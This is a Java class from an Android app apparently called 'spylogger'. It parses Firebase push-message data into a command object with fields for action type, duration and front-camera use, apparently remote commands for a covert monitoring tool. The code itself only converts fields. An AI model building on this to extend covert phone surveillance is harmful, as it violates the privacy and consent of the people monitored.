package com.gravatasufoca.spylogger.vos;

import android.util.Log;

import com.google.gson.Gson;
import com.gravatasufoca.spylogger.model.TipoAcao;

import java.lang.reflect.Field;
import java.util.Map;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 04/01/17.
 */

@Getter
@Setter
public class FcmMessageVO {

    private String phpId;
    private TipoAcao tipoAcao;
    private String chave;
    private Integer id;
    private Integer duracao;
    private Boolean cameraFrente;
    private ConfiguracaoVO configuracao;

    public static FcmMessageVO converter(Map<String, String> data) {
        FcmMessageVO fcmMessageVO = new FcmMessageVO();

        Field[] fields = FcmMessageVO.class.getDeclaredFields();
        for (Field field : fields) {

            if (data.containsKey(field.getName())) {
                field.setAccessible(true);
                try {
                    if (field.getType().isAssignableFrom(Integer.class)) {
                        field.set(fcmMessageVO, Integer.parseInt(data.get(field.getName())));
                    } else if (field.getType().isAssignableFrom(String.class)) {
                        field.set(fcmMessageVO, data.get(field.getName()));
                    } else if (field.getType().isAssignableFrom(Boolean.class)) {
                        field.set(fcmMessageVO, Boolean.parseBoolean(data.get(field.getName())));
                    } else if (field.getType().isAssignableFrom(TipoAcao.class)) {
                        field.set(fcmMessageVO, TipoAcao.values()[Integer.parseInt(data.get(field.getName()))]);
                    } else if (field.getType().isAssignableFrom(ConfiguracaoVO.class)) {
                        Gson gson=new Gson();
                        ConfiguracaoVO configuracaoVO= gson.fromJson(data.get(field.getName()),ConfiguracaoVO.class);
                        field.set(fcmMessageVO,configuracaoVO);
                    }


                    field.setAccessible(false);
                } catch (IllegalAccessException e) {
                    Log.e("erro",e.getMessage());
                }

            }
        }
        return fcmMessageVO;
    }

}
